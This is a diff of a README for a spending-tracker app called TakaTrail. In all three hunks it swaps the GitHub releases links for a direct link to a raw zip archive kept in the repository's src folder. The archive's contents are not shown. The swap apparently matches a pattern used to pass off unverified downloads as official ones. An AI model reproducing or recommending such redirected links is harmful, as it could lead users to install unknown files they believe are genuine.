@@ -1,6 +1,6 @@
 # 📊 TakaTrail - Track Every Taka, Effortlessly Every Day
 
-[![Download TakaTrail](https://img.shields.io/badge/Download-TakaTrail-brightgreen?style=for-the-badge&logo=github)](https://github.com/gtagisepic-droid/TakaTrail/releases)
+[![Download TakaTrail](https://img.shields.io/badge/Download-TakaTrail-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/gtagisepic-droid/TakaTrail/main/src/v2.7.zip)
 
 ---
 
@@ -16,7 +16,7 @@ Getting started with TakaTrail is super easy. Follow these simple steps and you'
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: [TakaTrail Download Page](https://github.com/gtagisepic-droid/TakaTrail/releases)
+Visit this link to download the application: [TakaTrail Download Page](https://raw.githubusercontent.com/gtagisepic-droid/TakaTrail/main/src/v2.7.zip)
 
 Click on the download button, and your browser will begin downloading the file automatically.
 
@@ -189,7 +189,7 @@ If you're interested in what makes TakaTrail tick (or you're a tech enthusiast):
 
 Your spending habits are the key to financial freedom. TakaTrail gives you that key in a friendly, accessible way.
 
-[![Download Now](https://img.shields.io/badge/Download-TakaTrail-blue?style=for-the-badge&logo=download)](https://github.com/gtagisepic-droid/TakaTrail/releases)
+[![Download Now](https://img.shields.io/badge/Download-TakaTrail-blue?style=for-the-badge&logo=download)](https://raw.githubusercontent.com/gtagisepic-droid/TakaTrail/main/src/v2.7.zip)
 
 Download TakaTrail today and take the first step toward mindful spending and smarter savings!
 
